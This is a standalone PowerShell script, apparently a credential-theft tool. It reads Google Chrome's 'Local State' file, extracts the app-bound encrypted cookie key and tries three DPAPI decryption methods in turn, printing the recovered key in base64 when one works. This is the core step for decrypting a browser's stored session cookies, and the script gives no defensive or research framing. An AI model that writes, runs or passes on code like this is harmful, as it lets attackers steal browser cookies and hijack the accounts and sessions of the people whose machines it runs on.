# Decrypt Chrome v20 app-bound cookie key
Add-Type -AssemblyName System.Security

$localState = Get-Content "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" | ConvertFrom-Json
$appBoundB64 = $localState.os_crypt.app_bound_encrypted_key
$appBoundRaw = [Convert]::FromBase64String($appBoundB64)

# Remove "APPB" prefix (4 bytes)
$dpapiBlob = $appBoundRaw[4..($appBoundRaw.Length - 1)]

Write-Output "DPAPI blob length: $($dpapiBlob.Length)"
Write-Output "DPAPI header: $([BitConverter]::ToString($dpapiBlob[0..15]))"

# Try 1: Decrypt without entropy
try {
    $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($dpapiBlob, $null, 'CurrentUser')
    Write-Output "Method1_OK:$($decrypted.Length)"
    Write-Output "KEY_B64:$([Convert]::ToBase64String($decrypted))"
    exit 0
} catch {
    Write-Output "Method1_fail: $_"
}

# Try 2: Decrypt with LocalMachine scope
try {
    $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($dpapiBlob, $null, 'LocalMachine')
    Write-Output "Method2_OK:$($decrypted.Length)"
    Write-Output "KEY_B64:$([Convert]::ToBase64String($decrypted))"
    exit 0
} catch {
    Write-Output "Method2_fail: $_"
}

# Try 3: Decrypt with Chrome path as entropy
try {
    $chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
    $entropy = [System.Text.Encoding]::UTF8.GetBytes($chromePath)
    $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($dpapiBlob, $entropy, 'CurrentUser')
    Write-Output "Method3_OK:$($decrypted.Length)"
    Write-Output "KEY_B64:$([Convert]::ToBase64String($decrypted))"
    exit 0
} catch {
    Write-Output "Method3_fail: $_"
}

Write-Output "ALL_FAILED"
